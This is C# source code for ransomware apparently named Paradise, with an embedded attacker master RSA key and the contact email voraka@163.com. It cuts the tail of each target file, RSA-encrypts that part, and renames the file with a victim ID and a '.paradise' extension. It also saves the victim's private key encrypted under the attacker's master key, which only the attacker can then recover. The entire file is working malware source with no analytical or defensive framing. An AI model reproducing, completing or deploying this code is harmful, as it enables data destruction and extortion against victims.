/*
 * Created by Voraka.
 * Date: 10/25/2017
 */
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Paradise
{
	class Program
	{
		public static string ID_Generator()
		{
			string text = "";
			Random random = new Random();
			while (text.Length < 8)
			{
				char c = (char)random.Next(33, 125);
				if (char.IsLetterOrDigit(c))
				{
					text += c;
				}
			}
			return text;
		}
		
		
		private static List<byte[]> GetPartOfFile(string fileName, int blocks_count)
		{
			List<byte[]> result;
			try
			{
				int num = blocks_count * 117;
				List<byte[]> list = new List<byte[]>();
				byte[] array = new byte[num];
				using (FileStream fileStream = File.OpenRead(fileName))
				{
					fileStream.Seek((long)(-(long)num), SeekOrigin.End);
					fileStream.Read(array, 0, num);
				}
				using (FileStream fileStream2 = File.OpenWrite(fileName))
				{
					fileStream2.SetLength(fileStream2.Length - (long)num);
				}
				int num2 = 0;
				for (int i = 0; i < blocks_count; i++)
				{
					byte[] array2 = new byte[117];
					for (int j = 0; j < 117; j++)
					{
						array2[j] = array[num2];
						num2++;
					}
					list.Add(array2);
				}
				result = list;
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}
		
		private static void EncryptFile(string file, RSACryptoServiceProvider ThRSA)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(file);
				if (fileInfo.Extension != ".paradise" && !fileInfo.FullName.Contains("#DECRYPT MY FILES#.txt") && fileInfo.Name != "id.dp")
				{
					List<byte[]> list = new List<byte[]>();
					List<byte> list2 = new List<byte>();
					if (fileInfo.Length / 1024L > 64L)
					{
						list = Program.GetPartOfFile(file, 547);
					}
					else
					{
						int blocks_count = Convert.ToInt32(fileInfo.Length / 117L);
						if (fileInfo.Length < 117L)
						{
							list.Add(File.ReadAllBytes(file));
							using (FileStream fileStream = File.OpenWrite(file))
							{
								fileStream.SetLength(0L);
								goto IL_C0;
							}
						}
						list = Program.GetPartOfFile(file, blocks_count);
					}
					IL_C0:
					if (list != null)
					{
						foreach (byte[] current in list)
						{
							byte[] collection = ThRSA.Encrypt(current, false);
							list2.AddRange(collection);
						}
						File.AppendAllText(file, "<CRYPTED>" + Convert.ToBase64String(list2.ToArray()) + "</CRYPTED>", Encoding.Default);
						File.Move(file, string.Concat(new string[]
						{
							file,
							"[id-",
							Program.PCID,
							"].[",
							Program.mail,
							"].paradise"
						}));
						File.Delete(file);
					}
				}
			}
			catch (Exception)
			{
			}
		}
				
		private static void SavePrivateKey()
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory).Replace("\\", "/");
			List<byte[]> list = new List<byte[]>();
			byte[] bytes = Encoding.Default.GetBytes(Program.RSA_Private);
			int num = Convert.ToInt32(Math.Ceiling((double)bytes.Length / 117.0));
			int num2 = 0;
			for (int i = 0; i < num; i++)
			{
				byte[] array = new byte[117];
				for (int j = 0; j < 117; j++)
				{
					if (bytes.Length > num2)
					{
						array[j] = bytes[num2];
						num2++;
					}
				}
				list.Add(array);
			}
			string text = "";
			foreach (byte[] current in list)
			{
				byte[] array2 = Program.MasterRSA.Encrypt(current, false);
				Console.WriteLine(array2.Length);
				text += Encoding.Default.GetString(array2);
			}
			text = Convert.ToBase64String(Encoding.Default.GetBytes(text));
			try
			{
				File.WriteAllText(str + "/DecryptionInfo.auth", text);
			}
			catch (Exception)
			{
				
			}
		}
		
		public static string mail = "voraka@163.com";
		public static string PCID = "";
		public static string RSA_Public = "";
		public static string RSA_MasterPublic = "<RSAKeyValue><Modulus>maTp68zA8ho6MOEQI9k7s75JZIPu5mNBMD8O04ssgvcVrtZNoqqLbe0cB6wc+yF+sLeyxuPdylh/0hBDKIJT4BheadiDqN0vyU2TlOYelVnkCt/SCOlz14BJsQBqdA4TCyztl7ClmUuhkdglBeXbyu28nxl+SbYdceBojtyRtzE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		public static string RSA_Private = "";
		public static RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
		public static RSACryptoServiceProvider MasterRSA = new RSACryptoServiceProvider();
		public static RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		
		public static void Main(string[] args)
		{				
					
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			string[] files = Directory.GetFiles(folderPath, "*.paradise", SearchOption.TopDirectoryOnly);
			Program.PCID = ID_Generator();
			Program.RSA_Public = rsa.ToXmlString(false);
			Program.RSA_Private = rsa.ToXmlString(true);
			Program.MasterRSA.FromXmlString(Program.RSA_MasterPublic);
			Program.rsa.FromXmlString(Program.RSA_Public);
			//Program.GetDrives();
			
			Program.rSACryptoServiceProvider.FromXmlString(RSA_Public);
			EncryptFile(@"C:\Users\Adminuser\Desktop\123.txt", rSACryptoServiceProvider);
			SavePrivateKey();
		}
	}
}